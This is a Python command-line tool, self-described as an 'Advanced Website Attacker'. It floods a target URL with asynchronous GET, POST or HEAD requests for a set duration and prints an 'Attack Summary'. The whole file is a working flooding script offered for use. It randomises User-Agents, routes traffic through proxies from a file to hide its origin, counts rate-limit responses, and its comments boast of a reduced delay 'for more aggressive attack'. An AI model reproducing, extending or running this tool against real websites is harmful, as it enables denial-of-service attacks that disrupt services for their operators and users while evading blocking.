import asyncio
import aiohttp
import random
import time
import logging
import argparse
from aiohttp_socks import ProxyConnector
from fake_useragent import UserAgent
from colorama import init, Fore, Style

# Initialize colorama for cross-platform color support
init(autoreset=True)

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

BANNER = f"""{Fore.CYAN}
  _    _ _____                      _ 
 | |  | |  __ \\     /\\        /\\   | |
 | |  | | |__) |   /  \\      /  \\  | |
 | |  | |  _  /   / /\\ \\    / /\\ \\ | |
 | |__| | | \\ \\  / ____ \\  / ____ \\|_|
  \\____/|_|  \\_\\/_/    \\_\\/_/    \\_(_)
                                      
{Style.RESET_ALL}"""

class WebsiteAttacker:
    def __init__(self, url, num_requests, duration, request_method='GET', headers=None, payload=None, proxies=None):
        self.url = url
        self.num_requests = num_requests
        self.duration = duration
        self.request_method = request_method.upper()
        self.headers = headers if headers else {}
        self.payload = payload
        self.proxies = proxies
        self.user_agent = UserAgent()
        self.successful_hits = 0
        self.failed_hits = 0
        self.start_time = time.time()
        self.rate_limit_hits = 0
        self.total_bytes_sent = 0
        self.total_bytes_received = 0

    async def hit_website(self, session):
        """Hit the website with a random User-Agent."""
        headers = {"User-Agent": self.user_agent.random}
        headers.update(self.headers)  # Include additional user-defined headers

        try:
            if self.request_method == 'GET':
                async with session.get(self.url, headers=headers) as response:
                    await self.process_response(response)
            elif self.request_method == 'POST':
                async with session.post(self.url, headers=headers, data=self.payload) as response:
                    await self.process_response(response)
            elif self.request_method == 'HEAD':
                async with session.head(self.url, headers=headers) as response:
                    await self.process_response(response)

        except aiohttp.ClientError as e:
            self.failed_hits += 1
            logging.error(f"Request failed: {str(e)}")

    async def process_response(self, response):
        if response.status == 200:
            self.successful_hits += 1
        elif response.status == 429:
            self.rate_limit_hits += 1
        else:
            self.failed_hits += 1

        self.total_bytes_sent += len(str(response.request_info))
        self.total_bytes_received += len(await response.read())

    async def start_attack(self):
        """Start the asynchronous attack."""
        connector = ProxyConnector.from_url(random.choice(self.proxies)) if self.proxies else None
        async with aiohttp.ClientSession(connector=connector) as session:
            tasks = []
            end_time = self.start_time + self.duration
            while time.time() < end_time and len(tasks) < self.num_requests:
                tasks.append(asyncio.create_task(self.hit_website(session)))
                await asyncio.sleep(random.uniform(0.05, 0.2))  # Reduced delay for more aggressive attack

            await asyncio.gather(*tasks)  # Wait for all tasks to complete

    def print_summary(self):
        """Print the attack summary."""
        total_requests = self.successful_hits + self.failed_hits + self.rate_limit_hits
        success_rate = (self.successful_hits / total_requests) * 100 if total_requests > 0 else 0
        total_time = time.time() - self.start_time
        requests_per_second = total_requests / total_time if total_time > 0 else 0

        logging.info(BANNER)
        logging.info(f"{Fore.YELLOW}Attack Summary:{Style.RESET_ALL}")
        logging.info(f"Method: {self.request_method} | Proxies: {'True' if self.proxies else 'False'}")
        logging.info(f"Successful Hits: {Fore.GREEN}{self.successful_hits}{Style.RESET_ALL}")
        logging.info(f"Failed Hits: {Fore.RED}{self.failed_hits}{Style.RESET_ALL}")
        logging.info(f"Rate Limited Hits: {Fore.YELLOW}{self.rate_limit_hits}{Style.RESET_ALL}")
        logging.info(f"Success Rate: {Fore.CYAN}{success_rate:.2f}%{Style.RESET_ALL}")
        logging.info(f"Requests per Second: {Fore.MAGENTA}{requests_per_second:.2f}{Style.RESET_ALL}")
        logging.info(f"Total Data Sent: {self.total_bytes_sent / 1024:.2f} KB")
        logging.info(f"Total Data Received: {self.total_bytes_received / 1024:.2f} KB")
        logging.info(f"Total Time: {total_time:.2f} seconds")

def main():
    parser = argparse.ArgumentParser(description="Advanced Website Attacker")
    parser.add_argument("url", help="Target URL")
    parser.add_argument("--threads", type=int, default=100, help="Number of threads (default: 100)")
    parser.add_argument("--method", choices=['GET', 'POST', 'HEAD'], default='GET', help="HTTP method (default: GET)")
    parser.add_argument("--payload", help="Payload for POST requests")
    parser.add_argument("--time", type=int, default=60, help="Attack duration in seconds (default: 60)")
    parser.add_argument("--proxies", action="store_true", help="Use proxies from proxy.txt")
    args = parser.parse_args()

    print(BANNER)

    proxies = None
    if args.proxies:
        try:
            with open('proxy.txt', 'r') as proxy_file:
                proxies = [line.strip() for line in proxy_file.readlines()]
        except FileNotFoundError:
            logging.error("proxy.txt not found. Running without proxies.")

    if args.method == 'POST' and not args.payload:
        logging.error("Payload is required for POST requests.")
        return

    attacker = WebsiteAttacker(args.url, args.threads, args.time, args.method, payload=args.payload, proxies=proxies)
    
    try:
        asyncio.run(attacker.start_attack())
        attacker.print_summary()
    except KeyboardInterrupt:
        logging.info("Attack interrupted by user.")
    except Exception as e:
        logging.error(f"An error occurred: {str(e)}")

if __name__ == "__main__":
    main()
